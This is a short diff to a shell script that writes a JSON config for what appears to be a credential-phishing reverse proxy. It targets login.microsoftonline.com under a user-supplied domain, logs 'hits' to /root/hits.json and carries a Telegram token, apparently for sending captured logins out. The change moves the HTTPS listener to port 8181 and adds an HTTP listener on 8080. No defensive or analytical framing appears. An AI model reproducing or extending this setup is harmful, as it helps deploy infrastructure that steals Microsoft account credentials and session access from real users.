@@ -102,7 +102,8 @@ cat << EOF > /root/config.json
 {
   "proxyDomain": "$USER_DOMAIN",
   "listeningAddress": "0.0.0.0",
-  "listeningPortHTTPS": 443,
+  "listeningPortHTTPS": 8181,
+  "listeningPortHTTP": 8080,
   "target": "login.microsoftonline.com",
   "log": "/root/hits.json",
   "telegramToken": "$TG_TOKEN",
